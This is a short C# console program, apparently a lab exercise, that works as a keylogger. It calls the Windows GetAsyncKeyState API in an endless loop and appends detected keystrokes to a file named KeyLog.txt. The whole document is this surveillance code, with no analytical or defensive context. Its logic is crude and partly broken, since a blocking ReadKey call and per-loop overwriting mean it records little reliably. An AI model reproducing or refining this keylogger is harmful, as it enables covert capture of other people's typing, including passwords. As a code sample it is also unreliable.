using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace LR_4_1
{
    class Program
    {
        static void Main(string[] args)
        {
            [DllImport("user32.dll")]
            static extern int GetAsyncKeyState(Int32 i);

            while (true)
            {
                StreamWriter f = new StreamWriter("KeyLog.txt", true);
                char key = ' ';
                for (int i = 8; i < 190; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        key = (char) i;
                    }
                }
                f.Write(key);
                Console.ReadKey();
                f.Close();
            }
        }
    }
}